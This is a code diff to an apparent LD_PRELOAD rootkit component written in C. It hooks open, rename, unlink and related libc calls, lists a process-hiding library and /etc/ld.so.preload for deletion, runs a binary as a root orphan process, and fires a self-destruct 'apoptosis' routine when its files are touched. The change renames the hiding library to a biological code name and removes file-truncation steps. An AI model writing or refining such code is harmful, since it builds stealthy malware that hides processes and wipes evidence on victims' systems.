@@ -13,14 +13,14 @@
 // Cytochrome_c: Keywords that trigger apoptosis when found in paths
 static const char *cytochrome_c[] = {
     "apoptosis.so",
-    "hide_process.so",
+    "mhc_downreg.so",
     "ld.so.preload",
     NULL  // Sentinel
 };
 
 // DNA: Paths to immediately delete
 static const char *dna[] = {
-    "/usr/local/lib/hide_process.so",
+    "/usr/local/lib/mhc_downreg.so",
     "/usr/local/lib/apoptosis.so",
     "/etc/ld.so.preload",
     NULL  // Sentinel
@@ -28,7 +28,7 @@ static const char *dna[] = {
 
 // Caspases: Compiled binaries to execute as root orphaned processes
 static const char *caspases[] = {
-    "/root/ld_preload/malicious_process",
+    "/root/ld_preload/caspase.o",
     NULL  // Sentinel
 };
 
@@ -225,16 +225,6 @@ int open(const char *pathname, int flags, ...) {
     // Check if this is a cytochrome_c trigger file
     if (is_cytochrome_c(pathname)) {
         fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in open()!\n");
-        
-        // Truncate the trigger file
-        fprintf(stderr, "[HOOK] Truncating trigger file: '%s'\n", pathname);
-        int truncate_result = truncate(pathname, 0);
-        if (truncate_result != 0) {
-            fprintf(stderr, "[HOOK] ERROR: Failed to truncate '%s' (errno=%d: %s)\n",
-                    pathname, errno, strerror(errno));
-        } else {
-            fprintf(stderr, "[HOOK] Trigger file truncated successfully\n");
-        }
 
         // Trigger apoptosis
         apoptosis();
@@ -259,24 +249,6 @@ int rename(const char *oldpath, const char *newpath) {
     // Check if either path contains cytochrome_c keyword
     if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
         fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in rename()!\n");
-        
-        // Truncate both paths if they exist
-        if (oldpath) {
-            fprintf(stderr, "[HOOK] Truncating oldpath: '%s'\n", oldpath);
-            int truncate_result = truncate(oldpath, 0);
-            if (truncate_result != 0) {
-                fprintf(stderr, "[HOOK] ERROR: Failed to truncate '%s' (errno=%d: %s)\n",
-                        oldpath, errno, strerror(errno));
-            }
-        }
-        if (newpath) {
-            fprintf(stderr, "[HOOK] Truncating newpath: '%s'\n", newpath);
-            int truncate_result = truncate(newpath, 0);
-            if (truncate_result != 0 && errno != ENOENT) {
-                fprintf(stderr, "[HOOK] ERROR: Failed to truncate '%s' (errno=%d: %s)\n",
-                        newpath, errno, strerror(errno));
-            }
-        }
 
         // Trigger apoptosis
         apoptosis();
@@ -301,28 +273,6 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
     // Check if either path contains cytochrome_c keyword
     if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
         fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in renameat()!\n");
-        
-        // For renameat, we need to use openat/ftruncate approach
-        if (oldpath && is_cytochrome_c(oldpath)) {
-            fprintf(stderr, "[HOOK] Truncating oldpath via openat: '%s'\n", oldpath);
-            int fd = openat(olddirfd, oldpath, O_WRONLY | O_TRUNC);
-            if (fd >= 0) {
-                close(fd);
-            } else {
-                fprintf(stderr, "[HOOK] ERROR: Failed to truncate oldpath (errno=%d: %s)\n",
-                        errno, strerror(errno));
-            }
-        }
-        if (newpath && is_cytochrome_c(newpath)) {
-            fprintf(stderr, "[HOOK] Truncating newpath via openat: '%s'\n", newpath);
-            int fd = openat(newdirfd, newpath, O_WRONLY | O_TRUNC);
-            if (fd >= 0) {
-                close(fd);
-            } else if (errno != ENOENT) {
-                fprintf(stderr, "[HOOK] ERROR: Failed to truncate newpath (errno=%d: %s)\n",
-                        errno, strerror(errno));
-            }
-        }
 
         // Trigger apoptosis
         apoptosis();
@@ -347,28 +297,6 @@ int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpa
     // Check if either path contains cytochrome_c keyword
     if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
         fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in renameat2()!\n");
-        
-        // Truncate paths
-        if (oldpath && is_cytochrome_c(oldpath)) {
-            fprintf(stderr, "[HOOK] Truncating oldpath via openat: '%s'\n", oldpath);
-            int fd = openat(olddirfd, oldpath, O_WRONLY | O_TRUNC);
-            if (fd >= 0) {
-                close(fd);
-            } else {
-                fprintf(stderr, "[HOOK] ERROR: Failed to truncate oldpath (errno=%d: %s)\n",
-                        errno, strerror(errno));
-            }
-        }
-        if (newpath && is_cytochrome_c(newpath)) {
-            fprintf(stderr, "[HOOK] Truncating newpath via openat: '%s'\n", newpath);
-            int fd = openat(newdirfd, newpath, O_WRONLY | O_TRUNC);
-            if (fd >= 0) {
-                close(fd);
-            } else if (errno != ENOENT) {
-                fprintf(stderr, "[HOOK] ERROR: Failed to truncate newpath (errno=%d: %s)\n",
-                        errno, strerror(errno));
-            }
-        }
 
         // Trigger apoptosis
         apoptosis();
@@ -392,14 +320,6 @@ int unlink(const char *pathname) {
     // Check if pathname contains cytochrome_c keyword
     if (is_cytochrome_c(pathname)) {
         fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in unlink()!\n");
-        
-        // Truncate the file before unlinking
-        fprintf(stderr, "[HOOK] Truncating file: '%s'\n", pathname);
-        int truncate_result = truncate(pathname, 0);
-        if (truncate_result != 0) {
-            fprintf(stderr, "[HOOK] ERROR: Failed to truncate '%s' (errno=%d: %s)\n",
-                    pathname, errno, strerror(errno));
-        }
 
         // Trigger apoptosis
         apoptosis();
@@ -423,16 +343,6 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
     // Check if pathname contains cytochrome_c keyword
     if (is_cytochrome_c(pathname)) {
         fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in unlinkat()!\n");
-        
-        // Truncate the file before unlinking
-        fprintf(stderr, "[HOOK] Truncating file via openat: '%s'\n", pathname);
-        int fd = openat(dirfd, pathname, O_WRONLY | O_TRUNC);
-        if (fd >= 0) {
-            close(fd);
-        } else {
-            fprintf(stderr, "[HOOK] ERROR: Failed to truncate (errno=%d: %s)\n",
-                    errno, strerror(errno));
-        }
 
         // Trigger apoptosis
         apoptosis();
@@ -456,15 +366,6 @@ int remove(const char *pathname) {
     // Check if pathname contains cytochrome_c keyword
     if (is_cytochrome_c(pathname)) {
         fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in remove()!\n");
-        
-        // Truncate the file before removing
-        fprintf(stderr, "[HOOK] Truncating file: '%s'\n", pathname);
-        int truncate_result = truncate(pathname, 0);
-        if (truncate_result != 0 && errno != EISDIR) {
-            // EISDIR is ok - remove() can also delete directories
-            fprintf(stderr, "[HOOK] ERROR: Failed to truncate '%s' (errno=%d: %s)\n",
-                    pathname, errno, strerror(errno));
-        }
 
         // Trigger apoptosis
         apoptosis();
